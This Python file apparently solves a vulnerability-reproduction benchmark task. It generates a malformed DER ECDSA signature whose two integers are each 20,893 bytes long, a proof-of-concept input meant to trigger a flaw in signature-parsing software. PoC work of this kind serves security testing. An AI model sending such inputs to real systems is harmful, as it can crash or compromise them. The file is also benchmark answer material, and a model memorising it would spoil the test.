import os
from typing import Optional


def _der_len(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 0x80:
        return bytes([n])
    b = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(b)]) + b


def _build_ecdsa_sig_der(int_len: int, bval: int = 0x01) -> bytes:
    if int_len <= 0:
        int_len = 1
    int_hdr = b"\x02" + _der_len(int_len)
    seq_content_len = 2 * (len(int_hdr) + int_len)
    seq_hdr = b"\x30" + _der_len(seq_content_len)
    v = bytes([bval]) * int_len
    return seq_hdr + int_hdr + v + int_hdr + v


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth-matching DER ECDSA signature structure:
        # SEQUENCE { INTEGER (20893 bytes), INTEGER (20893 bytes) } => 41798 bytes total
        return _build_ecdsa_sig_der(20893, 0x01)